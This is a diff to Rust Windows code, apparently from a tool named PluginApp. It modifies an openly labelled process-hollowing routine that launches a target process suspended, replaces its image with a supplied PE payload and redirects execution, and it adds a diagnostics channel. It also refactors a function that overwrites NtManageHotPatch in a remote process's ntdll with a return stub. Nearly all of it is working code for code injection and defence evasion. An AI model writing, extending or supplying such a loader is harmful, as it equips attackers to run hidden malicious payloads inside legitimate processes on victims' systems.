@@ -1,14 +1,20 @@
-use windows::{core::BOOL, Wdk::System::Threading::PROCESSINFOCLASS, Win32::{Foundation::*, Security::{AdjustTokenPrivileges, LookupPrivilegeValueA, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY}, System::{Diagnostics::Debug::*, LibraryLoader::*, Memory::*, ProcessStatus::{EnumProcessModulesEx, GetModuleBaseNameA, ENUM_PROCESS_MODULES_EX_FLAGS}, Threading::*}}};
+use windows::{core::BOOL, Win32::{Foundation::*, Security::{AdjustTokenPrivileges, LookupPrivilegeValueA, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY}, System::{Diagnostics::Debug::*, LibraryLoader::*, Memory::*, Threading::*}}};
 use windows::Wdk::System::{Memory::NtUnmapViewOfSection, Threading::NtQueryInformationProcess};
-use windows::Win32::System::SystemServices::IMAGE_DOS_HEADER;
+use crate::{hollow::diagnostics::HollowDiagnostics, PluginApp};
 use windows_strings::{s, PCSTR, PSTR};
 use std::ffi::c_void;
-use crate::PluginApp;
+
+pub mod diagnostics;
 
 impl PluginApp {
     /// A corrected and robust implementation of process hollowing for EXEs.
-    pub unsafe fn hollow_process_with_exe2(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
+    pub unsafe fn hollow_process_with_exe2(
+        pe_data: &[u8],
+        target_exe: &str,
+        diag_sender: &crossbeam::channel::Sender<HollowDiagnostics>,
+    ) -> anyhow::Result<u32, anyhow::Error> {
         log::info!("Starting process hollowing for target: {}", target_exe);
+        let hollow_diagnostics = &mut HollowDiagnostics::default();
 
         // 1. Create the target process in a suspended state
         let startup_info = STARTUPINFOA::default();
@@ -61,8 +67,14 @@ impl PluginApp {
 
         // Log original RSP and RBP
         let original_rsp = context.Rsp;
+        hollow_diagnostics.rsp_before = original_rsp;
         let original_rbp = context.Rbp;
-        log::info!("Original RSP: 0x{:X}\nOriginal RBP: 0x{:X}", original_rsp, original_rbp);
+        hollow_diagnostics.rbp_before = original_rbp;
+        let original_rip = context.Rip;
+        hollow_diagnostics.rip_before = original_rip;
+        let _ = diag_sender.try_send(hollow_diagnostics.clone());
+        
+        log::info!("Original RIP: 0x{:X}\nOriginal RSP: 0x{:X}\nOriginal RBP: 0x{:X}", original_rip, original_rsp, original_rbp);
 
         // 2. Get the PEB address and image base address
         let mut pbi = PROCESS_BASIC_INFORMATION::default();
@@ -397,6 +409,68 @@ impl PluginApp {
         unsafe { CloseHandle(h_thread)? };
         unsafe { CloseHandle(h_process)? };
 
+        let new_rip = new_base as u64 + entry_rva as u64;
+        let new_rsp = (original_rsp & !0xF) - 8;
+        // TLS directory before/after
+        let original_tls_dir = pe.header.optional_header.as_ref().and_then(|opt| opt.data_directories.get_tls_table().cloned());
+        let new_tls_dir = opt.data_directories.get_tls_table().cloned();
+        // Section diagnostics
+        let mut section_diagnostics = Vec::new();
+        for section in pe.sections.iter() {
+            let name = String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()).to_string();
+            let rva = section.virtual_address;
+            let raw_ptr = section.pointer_to_raw_data;
+            let raw_size = section.size_of_raw_data;
+            let virt_size = section.virtual_size;
+            let characteristics = section.characteristics;
+            let protection = if characteristics & 0x20000000 != 0 {
+                "EXECUTE"
+            } else if characteristics & 0x80000000 != 0 {
+                "WRITE"
+            } else if characteristics & 0x40000000 != 0 {
+                "READ"
+            } else {
+                "NOACCESS"
+            };
+            section_diagnostics.push((name, rva, raw_ptr, raw_size, virt_size, characteristics, protection));
+        }
+        // Relocation diagnostics
+        let reloc_dir = pe.header.optional_header.as_ref().and_then(|opt| opt.data_directories.get_base_relocation_table());
+        let reloc_rva = reloc_dir.map(|d| d.virtual_address).unwrap_or(0);
+        let reloc_size = reloc_dir.map(|d| d.size).unwrap_or(0);
+        // Entry point diagnostics
+        let original_entry_rva = pe.header.optional_header.as_ref().map(|opt| opt.standard_fields.address_of_entry_point).unwrap_or(0);
+        let new_entry_rva = entry_rva;
+        // Register diagnostics
+        let original_regs = (original_rip, original_rsp, original_rbp);
+        let new_regs = (new_rip, new_rsp, context.Rbp);
+        // TLS directory diagnostics
+        let tls_before = original_tls_dir.as_ref().map(|d| (d.virtual_address, d.size)).unwrap_or((0,0));
+        let tls_after = new_tls_dir.as_ref().map(|d| (d.virtual_address, d.size)).unwrap_or((0,0));
+
+        // Send diagnostics to channel
+        let diag = HollowDiagnostics {
+            base_address_before: remote_image_base,
+            base_address_after: new_base,
+            entry_point_rva_before: original_entry_rva,
+            entry_point_rva_after: new_entry_rva,
+            rip_before: original_regs.0,
+            rip_after: new_regs.0,
+            rsp_before: original_regs.1,
+            rsp_after: new_regs.1,
+            rbp_before: original_regs.2,
+            rbp_after: new_regs.2,
+            tls_rva_before: tls_before.0,
+            tls_rva_after: tls_after.0,
+            tls_size_before: tls_before.1,
+            tls_size_after: tls_after.1,
+            reloc_rva_before: reloc_rva,
+            reloc_rva_after: reloc_rva,
+            reloc_size_before: reloc_size,
+            reloc_size_after: reloc_size,
+            sections: section_diagnostics.clone(),
+        };
+        let _ = diag_sender.send(diag);
         Ok(process_info.dwProcessId)
     }
 
@@ -1340,8 +1414,7 @@ pub fn patch_nt_manage_hotpatch64(h_process: HANDLE) -> anyhow::Result<(), anyho
     use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
     use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory, FlushInstructionCache};
     use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, PAGE_EXECUTE_READ};
-    use windows::Win32::System::Threading::GetProcessId;
-    use windows::Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS};
+    use windows_strings::PCSTR;
     use std::ffi::c_void;
 
     // Get local ntdll base and NtManageHotPatch offset
@@ -1352,69 +1425,15 @@ pub fn patch_nt_manage_hotpatch64(h_process: HANDLE) -> anyhow::Result<(), anyho
         None => return Err(anyhow::anyhow!("GetProcAddress(NtManageHotPatch) failed")),
     };
     let offset = (ntmanage_addr as usize) - (ntdll.0 as usize);
-    log::debug!("Local NtManageHotPatch offset: 0x{:X}", offset);
 
-    // Get target PID
-    let pid = unsafe { GetProcessId(h_process) };
-    log::debug!("Target process PID: {}", pid);
-
-    // Use NtQueryInformationProcess to get module information
-    #[repr(C)]
-    struct MODULE_INFORMATION {
-        base_of_dll: *mut c_void,
-        size_of_image: u32,
-        entry_point: *mut c_void,
-    }
-    #[repr(C)]
-    struct PROCESS_MODULE_INFORMATION {
-        number_of_modules: u32,
-        modules: [MODULE_INFORMATION; 1],
-    }
-
-    let mut module_info = vec![0u8; 1024 * std::mem::size_of::<MODULE_INFORMATION>()];
-    let mut return_length = 0u32;
-    let status = unsafe {
-        NtQueryInformationProcess(
-            h_process,
-            PROCESSINFOCLASS(11), // ProcessModuleInformation
-            module_info.as_mut_ptr() as *mut c_void,
-            module_info.len() as u32,
-            &mut return_length,
-        )
-    };
-    if !status.is_ok() {
-        return Err(anyhow::anyhow!("NtQueryInformationProcess (ProcessModuleInformation) failed: {:?}", status));
-    }
-
-    let module_info = unsafe { &*(module_info.as_ptr() as *const PROCESS_MODULE_INFORMATION) };
-    let mut remote_ntdll: *mut c_void = std::ptr::null_mut();
-    for i in 0..module_info.number_of_modules as usize {
-        let module = &module_info.modules[i];
-        let mut module_name_buf = [0u8; 256];
-        let len = unsafe {
-            GetModuleBaseNameA(
-                h_process,
-                Some(HMODULE(module.base_of_dll)),
-                &mut module_name_buf,
-            )
-        };
-        if len > 0 {
-            let module_name = String::from_utf8_lossy(&module_name_buf[..len as usize]).to_lowercase();
-            log::debug!("Found module: {} at 0x{:X}", module_name, module.base_of_dll as usize);
-            if module_name.contains("ntdll.dll") {
-                remote_ntdll = module.base_of_dll;
-                break;
-            }
-        }
-    }
-
+    // Get remote ntdll base in target process
+    let remote_ntdll = crate::PluginApp::get_remote_module_base_handle(h_process, "ntdll.dll")?;
     if remote_ntdll.is_null() {
         return Err(anyhow::anyhow!("Remote ntdll.dll not found"));
     }
     let remote_patch_addr = (remote_ntdll as usize + offset) as *mut c_void;
-    log::debug!("Remote NtManageHotPatch address: 0x{:X}", remote_patch_addr as usize);
 
-    // Prepare patch bytes: mov eax, C00000BB (STATUS_NOT_SUPPORTED); ret
+    // Prepare patch bytes: mov eax, C00000BB; ret
     let patch: [u8; 6] = [0xB8, 0xBB, 0x00, 0x00, 0xC0, 0xC3];
     let stub_size = 0x20;
     let mut old_protect = PAGE_PROTECTION_FLAGS(0);
@@ -1450,6 +1469,7 @@ pub fn patch_nt_manage_hotpatch64(h_process: HANDLE) -> anyhow::Result<(), anyho
     log::debug!("NtManageHotPatch patched at 0x{:X}", remote_patch_addr as usize);
     Ok(())
 }
+
 /// Helper function to convert RVA to file offset
 pub fn rva_to_offset(pe_data: &[u8], rva: usize) -> Option<usize> {
     let pe = goblin::pe::PE::parse(pe_data).ok()?;
